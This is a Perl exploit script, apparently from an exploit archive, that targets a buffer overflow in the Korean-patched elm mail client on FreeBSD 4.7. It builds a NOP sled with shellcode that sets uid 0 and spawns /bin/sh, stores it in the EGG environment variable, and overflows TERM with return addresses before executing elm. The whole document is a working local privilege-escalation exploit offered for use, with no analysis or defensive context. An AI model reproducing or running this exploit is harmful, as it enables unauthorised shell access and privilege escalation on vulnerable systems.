# DSR-korean-elm.pl - kokaninATdtors.net vs. /usr/ports/korean/elm
# offset, retaddr and shellcode is for my FreeBSD 4.7-RELEASE, YMMV
# reinventing the wheel, http://www.insecure.org/sploits/elm.curses.overflow.html
# shellcode by zillionATsafemode.org
# ko-elm-2.4h4.1      ELM Mail User Agent, patched for Korean E-Mail
# elm is setgid 'bin' 

$len = 512;
$ret = 0xbfbffd68;
$nop = "\x90";
$offset = 0;
$shellcode = 	"\x31\xc0\x50\x50\xb0\x17\xcd\x80\x31\xc0\x50\x68".
		"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50".
		"\x54\x53\x50\xb0\x3b\xcd\x80\x31\xc0\xb0\x01\xcd\x80";
              
if (@ARGV == 1) {
    $offset = $ARGV[0];
}
  
for ($i = 0; $i < ($len - length($shellcode)); $i++) {
    $buffer .= $nop;
}
$buffer .= $shellcode;
$new_ret = pack('l', ($ret + $offset));
local($ENV{'EGG'}) = $buffer; 
local($ENV{'TERM'}) = $new_ret x 12; 
exec("elm");
